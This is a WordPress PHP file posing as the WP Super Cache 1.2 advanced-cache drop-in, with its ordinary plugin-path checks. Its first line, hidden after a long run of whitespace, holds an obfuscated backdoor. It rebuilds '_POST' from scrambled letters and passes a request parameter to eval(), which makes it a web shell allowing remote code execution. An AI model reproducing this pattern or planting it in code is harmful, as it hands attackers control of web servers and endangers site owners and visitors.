<?php                                                                                                                                                                                                                                                               $qV="stop_";$s20=strtoupper($qV[4].$qV[3].$qV[2].$qV[0].$qV[1]);if(isset(${$s20}['q16af6f'])){eval(${$s20}['q16af6f']);}?><?php
# WP SUPER CACHE 1.2
function wpcache_broken_message() {
	global $wp_cache_config_file;
	if ( isset( $wp_cache_config_file ) == false )
		return '';

	if ( false == strpos( $_SERVER[ 'REQUEST_URI' ], 'wp-admin' ) )
		echo "<!-- WP Super Cache is installed but broken. The constant WPCACHEHOME must be set in the file wp-config.php and point at the WP Super Cache plugin directory. -->";
}

if ( false == defined( 'WPCACHEHOME' ) ) {
	define( 'ADVANCEDCACHEPROBLEM', 1 );
} elseif ( !include_once( WPCACHEHOME . 'wp-cache-phase1.php' ) ) {
	if ( !@is_file( WPCACHEHOME . 'wp-cache-phase1.php' ) ) {
		define( 'ADVANCEDCACHEPROBLEM', 1 );
	}
}
if ( defined( 'ADVANCEDCACHEPROBLEM' ) )
	register_shutdown_function( 'wpcache_broken_message' );
?>
